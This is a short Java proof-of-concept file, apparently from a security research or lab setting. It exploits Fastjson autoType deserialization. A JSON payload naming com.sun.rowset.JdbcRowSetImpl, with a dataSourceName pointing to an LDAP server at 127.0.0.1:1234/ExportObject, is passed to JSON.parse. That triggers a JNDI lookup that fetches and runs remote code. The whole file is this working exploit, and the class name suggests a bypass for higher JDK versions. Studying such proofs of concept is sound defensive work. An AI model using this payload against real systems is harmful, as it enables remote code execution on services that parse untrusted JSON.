import com.alibaba.fastjson.JSON;

public class HighJdkBypass {
    public static void main(String[] args) {
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);
    }
}
